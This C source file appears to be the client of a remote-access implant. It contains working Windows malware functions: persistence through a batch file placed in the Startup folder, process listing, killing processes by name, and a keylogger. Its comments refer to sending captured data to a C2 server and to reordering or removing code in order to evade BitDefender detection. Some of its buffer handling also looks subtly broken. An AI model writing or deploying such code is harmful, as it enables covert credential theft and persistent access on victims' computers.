#include "defines.h"
#include "functions.h"

/*
 * creates STARTUP_NAME.bat in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 * 
 * char *user: the username that will execute the script upon login
 * 
 * returns: 1 if successful
 */
int getPersistence(char *user)
{
	// Allocate a buffer that will be used to build the path of the user's startup folder
	char *startup = malloc(STR_LEN * sizeof(char));
	mcpy(startup, "C:\\Users\\", 11);
	scat(startup, user);
	scat(startup, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"); // NOTE: %APPDATA% can be used here
	scat(startup, STARTUP_NAME);
	free(user); // Free the buffer that was passed to this function by getUsername

	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory
	int dirlen = GetCurrentDirectory(0, NULL) + slen(STARTUP_NAME); // To determine the required buffer size, pass nBufferLength=0, NULL
	char *dir = malloc(dirlen * sizeof(char));						// Now allocate space for that number of characters
	GetCurrentDirectory(dirlen, dir);								// Returns the number of characters that are written to the buffer, not including null
	scat(dir, "\\client.exe");

	FILE *f = fopen(startup, "w");
	if (f == NULL)
		return 0;

	fprintf(f, dir); // Write executable's complete path to the startup script
	free(dir);
	fclose(f);
	
	printf(
			"[!] Persistence established:\n"
			"    %s\n\n",
			startup);

	free(startup);
	return 1;
}

/*
 * fills a buffer with a list of running processes
 * 
 * char *buf: buffer to be written to
 * int n: size of buf in bytes
 * 
 * returns: 1 if successful
 * 			0 if unsuccessful
 */
int getProcesses(char *buf, int n)
{
	// Get an open handle to Kernel32.dll to save the procedure addresses for CreateToolhelp32Snapshot, Process32First, and Process32Next
	t_CreateToolhelp32Snapshot CreateToolhelp32Snapshot = (t_CreateToolhelp32Snapshot)dllCall("Kernel32.dll", "CreateToolhelp32Snapshot");
	t_Process32First Process32First = (t_Process32First)GetProcAddress(hDLL, "Process32First");
	t_Process32Next Process32Next = (t_Process32Next)GetProcAddress(hDLL, "Process32Next");
	CloseHandle(hDLL);

	// Get an open handle to a snapshot of the system that includes all processes in the system
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) // If CreateToolHelp32Snapshot fails, it returns INVALID_HANDLE_VALUE
		return 0;

	// Create the PE32 structure which Process32First will use to store information about the first process from hProcessSnap
	PROCESSENTRY32 pe32;

	// The calling application must set the dwSize member of PROCESSENTRY32 to the size, in bytes, of the structure
	pe32.dwSize = sizeof(pe32);

	// Retrieve information about the first process in hProcessSnap and store it in pe32
	if (!Process32First(hSnap, &pe32)) // Returns TRUE if the first entry of the process list has been copied to pe32 or FALSE otherwise
	{
		CloseHandle(hSnap);
		return 0;
	}

	int len = 0;
	char *pd = buf;
	do
	{
		len = slen(pe32.szExeFile);					// Calculate the length of the process' name
		mcpy(pd, pe32.szExeFile, len);				// Insert the name of the executable into buf
		mcpy(pd + len, PROCESS_DELIM, len);			// Delimit buf for sanity's sake
		pd += len + 3;								// Increment pointer by the size of the name + delimiter - null byte (what was just inserted)
		n -= len + 4;								// Keep track of buffer length so there's no overflow
	} while (Process32Next(hSnap, &pe32) && n > 0); // Returns TRUE if the next entry of the process list has been copied to pe32 or FALSE otherwise

	CloseHandle(hSnap);

	return 1;
}

/*
 * kills a process by name
 * 
 * const char *procName: the name of the process to kill (case sensitive)
 * 
 * returns: 1 if successful
 * 		 	0 if unsuccessul
 */
int killProcess(const char *procName)
{
	// Get an open handle to Kernel32.dll to save the procedure addresses we will need
	t_CreateToolhelp32Snapshot CreateToolhelp32Snapshot = (t_CreateToolhelp32Snapshot)dllCall("Kernel32.dll", "CreateToolhelp32Snapshot");
	t_Process32First Process32First = (t_Process32First)GetProcAddress(hDLL, "Process32First");
	t_Process32Next Process32Next = (t_Process32Next)GetProcAddress(hDLL, "Process32Next");
	t_OpenProcess OpenProcess = (t_OpenProcess)GetProcAddress(hDLL, "OpenProcess");
	t_TerminateProcess TerminateProcess = (t_TerminateProcess)GetProcAddress(hDLL, "TerminateProcess");
	CloseHandle(hDLL);

	// Get an open handle to a snapshot of the system that includes all processes and threads, plus the processes' heaps and modules
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0x00);
	if (hSnap == INVALID_HANDLE_VALUE) // If CreateToolHelp32Snapshot fails, it returns INVALID_HANDLE_VALUE
		return 0;

	// Create the PE32 structure which Process32First will use to store information about the first process from hSnap
	PROCESSENTRY32 pe32;

	// The calling application must set the dwSize member of PROCESSENTRY32 to the size, in bytes, of the structure
	pe32.dwSize = sizeof(pe32);

	// Retrieve information about the first process in hProcessSnap and store it in pe32
	if (!Process32First(hSnap, &pe32)) // Returns TRUE if the first entry of the process list has been copied to pe32 or FALSE otherwise
	{
		CloseHandle(hSnap);
		return 0;
	}

	HANDLE hProc = NULL;
	do
	{
		if (scmp(pe32.szExeFile, procName) == 0) // Check if the name of this process matches what was passed to this function
		{
			// https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
			// Get an open handle to the process object (by passing its ID), specifying the desire to call TerminateProcess
			hProc = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pe32.th32ProcessID);
			if (hProc != NULL)
			{
				// Terminate the process and close the handle to it
				TerminateProcess(hProc, 9);
				CloseHandle(hProc);
			}
		}
	} while (Process32Next(hSnap, &pe32)); // Returns TRUE if the next entry of the process list has been copied to pe32 or FALSE otherwise

	CloseHandle(hSnap);
	return 1;
}

/*
 * copies n keystrokes into a buffer
 * 
 * char *buf: the buffer to be filled with keystrokes
 * int n: the size of the buffer (or how many keystrokes to capture)
 * 
 * returns: 1 if successful
 */
int getKeystrokes(char *buf, int n)
{
	// Get an open handle to User32.dll to save the procedure addresses for GetAsyncKeyState, GetKeyState
	t_GetAsyncKeyState GetAsyncKeyState = (t_GetAsyncKeyState)dllCall("User32.dll", "GetAsyncKeyState");
	t_GetKeyState GetKeyState = (t_GetKeyState)GetProcAddress(hDLL, "GetKeyState");
	CloseHandle(hDLL);

	char *p = buf;
	int sz = 0; // The length of the tag that identifies what key was pressed

	char * key;
	int caps = 0;
	int shift = 0;

	while (n > sz-1) // n > sz to pad the buffer so the tags don't overflow
	{
		for (int keyCode = 0; keyCode <= 256; keyCode++) // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
		{
			// Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call
			if (GetAsyncKeyState(keyCode) & 0x8001 == 0x8001) // Returns most significant bit set = key is down. Least significant bit is set = key was pressed
			{
				// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled
				caps = GetKeyState(VK_CAPITAL) & 0x0001; // If the low-order bit (of GetKeyState's return value) is 1, the key is toggled
				shift = GetKeyState(VK_SHIFT) >> 15;	 // If the high-order bit (of GetKeyState's return value) is 1, the key is down; otherwise, it is up

				// BD Antivirus detects this switch statement as Generic.Malware.SL!. Simply SWITCHING up (<-hilarious) the cases' order bypasses this
				switch (keyCode)
				{
				case VK_SPACE: key = " "; break;

				// If Caps Lock is toggled (if Shift is down too, key is lowercase) : If Caps Lock is not toggled (if Shift is down then key is uppercase)
				// Reference: https://packetstormsecurity.com/files/150023/Windows-x64-Remote-Bind-TCP-Keylogger-Shellcode.html
 				case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a");	break;
				case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b");	break;
				case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c");	break;
				case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d");	break;
				case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e");	break;
				case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f");	break;
				case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g");	break;
				case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h");	break;
				case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i");	break;
				case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j");	break;
				case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k");	break;
				case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l");	break;
				case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m");	break;
				case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n");	break;
				case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o");	break;
				case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p");	break;
				case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q");	break;
				case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r");	break;
				case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s");	break;
				case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t");	break;
				case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u");	break;
				case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v");	break;
				case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w");	break;
				case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x");	break;
				case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y");	break;
				case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z");	break;
 
				case VK_BACK:		key = "[BCK]";	break;
				case VK_DELETE:		key = "[DEL]";	break;
				case VK_RETURN:		key = "\n";		break;
				case VK_TAB:		key = "    ";	break;

				// Number Keys with shift
				case 0x30:	key = shift ? ")" : "0"; break;
				case 0x31:	key = shift ? "!" : "1"; break;
				case 0x32:	key = shift ? "@" : "2"; break;
				case 0x33:	key = shift ? "#" : "3"; break;
				case 0x34:	key = shift ? "$" : "4"; break;
				case 0x35:	key = shift ? "%" : "5"; break;
				case 0x36:	key = shift ? "^" : "6"; break;
				case 0x37:	key = shift ? "&" : "7"; break;
				case 0x38:	key = shift ? "*" : "8"; break;
				case 0x39:	key = shift ? "(" : "9"; break;

				// OEM Keys with shift
				case VK_OEM_PLUS:	key = shift ? "+" : "=";  break;
				case VK_OEM_COMMA:	key = shift ? "<" : ",";  break;
				case VK_OEM_MINUS:	key = shift ? "_" : "-";  break;
				case VK_OEM_PERIOD:	key = shift ? ">" : ".";  break;
				case VK_OEM_1:		key = shift ? ":" : ";";  break;
				case VK_OEM_2:		key = shift ? "?" : "/";  break;
				case VK_OEM_3:		key = shift ? "~" : "`";  break;
				case VK_OEM_4:		key = shift ? "{" : "[";  break;
				case VK_OEM_5:		key = shift ? "|" : "\\"; break;
				case VK_OEM_6:		key = shift ? "}" : "]";  break;
				case VK_OEM_7:		key = shift ? "\"" : "'"; break;

				// Num Keyboard
				case VK_NUMPAD0:	key = "0";	break;
				case VK_NUMPAD1:	key = "1";	break;
				case VK_NUMPAD2:	key = "2";	break;
				case VK_NUMPAD3:	key = "3";	break;
				case VK_NUMPAD4:	key = "4";	break;
				case VK_NUMPAD5:	key = "5";	break;
				case VK_NUMPAD6:	key = "6";	break;
				case VK_NUMPAD7:	key = "7";	break;
				case VK_NUMPAD8:	key = "8";	break;
				case VK_NUMPAD9:	key = "9";	break;
				case VK_MULTIPLY:	key = "*";	break;
				case VK_ADD:		key = "+";	break;
				case VK_SEPARATOR:	key = "-";	break;
				case VK_SUBTRACT:	key = "-";	break;
				case VK_DECIMAL:	key = ".";	break;
				case VK_DIVIDE:		key = "/";	break;

				case VK_UP:			key = "[U]";	break;
				case VK_LEFT:		key = "[L]";	break;
				case VK_RIGHT:		key = "[R]";	break;
				case VK_DOWN:		key = "[D]";	break;
				case VK_END:		key = "[E]";	break;
				case VK_HOME:		key = "[H]";	break;
				case VK_PRIOR:		key = "[PUP]";	break;
				case VK_NEXT:		key = "[PDN]";	break;
				case VK_CONTROL:	key = "[CTRL]";	break;
				case VK_LCONTROL:	key = "[CTRL]";	break;
				case VK_RCONTROL:	key = "[CTRL]";	break;
				case VK_INSERT:		key = "[INS]";	break;
				case VK_CANCEL:		key = "[COPY]";	break; // TODO: If something is copied, send it to the C2 server
				
				// Had to remove some here to evade BitDefender antivirus... not a huge deal (credentials wouldn't contain them and they didn't effect cursor navigation)

				default: key = "";
				}
				// TODO: If a key was captured, send the name of the current window or tab to the C2 server

				if(!key)
					continue;
				// Calculate the length of the identifying tag
				sz = slen(key);

				printf("%s", (char *)key);

				// Insert identifying tag into the buffer
				mcpy(p-1, key, sz);

				// Increment the pointer by the length of the string that was inserted
				p += sz;

				// And decrement the variable that ensures the buffer isn't overflowed by the longest tag ([PRTSCRN])
				n -= sz;
			}
		}
	}
	return 1;
}